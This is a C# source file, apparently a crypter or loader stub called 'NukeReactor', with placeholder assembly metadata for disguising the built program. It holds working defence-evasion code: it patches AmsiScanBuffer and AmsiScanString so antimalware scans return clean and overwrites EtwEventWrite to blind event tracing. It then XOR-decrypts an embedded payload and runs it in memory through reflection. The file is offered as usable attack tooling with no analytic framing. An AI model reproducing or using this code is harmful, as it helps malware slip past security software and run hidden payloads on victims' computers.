using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Collections.Generic;
#if UseAssembly
using System.Runtime.CompilerServices;
[assembly: AssemblyTitle("%TITLE%")]
[assembly: AssemblyDescription("%DESC%")]
[assembly: AssemblyCompany("%COMPANY%")]
[assembly: AssemblyProduct("%PRODUCT%")]
[assembly: AssemblyCopyright("%COPYRIGHT%")]
[assembly: AssemblyTrademark("%TRADEMARK%")]
[assembly: AssemblyVersion("%VERSION%")]
[assembly: AssemblyFileVersion("%FILE_VERSION%")]
#endif

namespace NukeReactor
{
    internal class xM41n
    {
        static void Main(string[] args)
        {

            try
            {
                Assembly.Load(new byte[0]);
            }
            catch
            {
                Patchers.Execute();

                byte[] decryptedBytes = BridgeDecryptor.Decrypt(BridgeConf.HexPayload, BridgeConf.HexKey);

                BridgeRuntime.Execute(decryptedBytes);

            }
        }
    }
#if ProtectFunctions
    public class XorBytes
    {
        private static byte key = 0x95;

        public static string XorDecrypt(string encryptedInput)
        {
            var decryptedChars = new List<string>();
            var numbers = encryptedInput.Split('%X%');

            foreach (var num in numbers)
            {
                int charCode;
                if (int.TryParse(num, out charCode))
                {
                    decryptedChars.Add(((char)(charCode ^ key)).ToString());
                }
            }

            return string.Concat(decryptedChars);
        }
    }
#endif

    internal class BridgeDecryptor
    {
        public static byte[] Decrypt(byte[] HexPayload, byte[] key)
        {
            byte[] decryptedBytes = new byte[HexPayload.Length];

            for (int i = 0; i < HexPayload.Length; i++)
            {
                decryptedBytes[i] = (byte)(HexPayload[i] ^ key[i % key.Length]);
            }

            return decryptedBytes;
        }
    }

    internal class BridgeRuntime
    {
        public static void Execute(byte[] decryptedBytes)
        {
            Assembly assembly = Assembly.Load(decryptedBytes);
            MethodInfo entryPoint = assembly.EntryPoint;
            if (entryPoint != null)
            {
                object[] parameters = entryPoint.GetParameters().Length == 0 ? null : new object[] { new string[] { } };
                entryPoint.Invoke(null, parameters);
            }
        }
    }

    internal class BridgeConf
    {
        public static byte[] HexPayload = new byte[] { };
        public static byte[] HexKey = new byte[] { };
    }

    internal class Patchers
    {
        public static void Execute()
        {
            Patchers.AmsiPatch();

            Patchers.EtwPatch();

        }
        public static void EtwPatch()
        {
            try
            {
                byte[] patchBytes = { 0xc2, 0x14, 0x00 };
                IntPtr ntdllLibrary = NativeImports.LoadLibrary("ntdll.dll");
                IntPtr eventLib = NativeImports.GetProcAddress(ntdllLibrary, "EtwEventWrite");

                uint previousProtection;
                NativeImports.VirtualProtect(eventLib, (UIntPtr)patchBytes.Length, 0x40, out previousProtection);
                Marshal.Copy(patchBytes, 0, eventLib, patchBytes.Length);
            }
            catch
            {
                return;
            }
        }

        public static void AmsiPatch()
        {
            try
            {
                IntPtr amsiModule = NativeImports.GetModuleHandle("amsi.dll");
                if (amsiModule == IntPtr.Zero) return;

                PatchFunction(amsiModule, "AmsiScanBuffer");
                PatchFunction(amsiModule, "AmsiScanString");
            }
            catch
            {
                return;
            }
        }
        private static void PatchFunction(IntPtr module, string functionName)
        {
            uint previousProtection;

            IntPtr funcAddress = NativeImports.GetProcAddress(module, functionName);
            if (funcAddress == IntPtr.Zero) return;

            byte[] patchBytes = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret

            uint oldProtect;
            NativeImports.VirtualProtect(funcAddress, (UIntPtr)patchBytes.Length, 0x40, out oldProtect);
            Marshal.Copy(patchBytes, 0, funcAddress, patchBytes.Length);
            NativeImports.VirtualProtect(funcAddress, (UIntPtr)patchBytes.Length, oldProtect, out previousProtection);
        }
    }
    
    internal static class NativeImports
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(
            IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}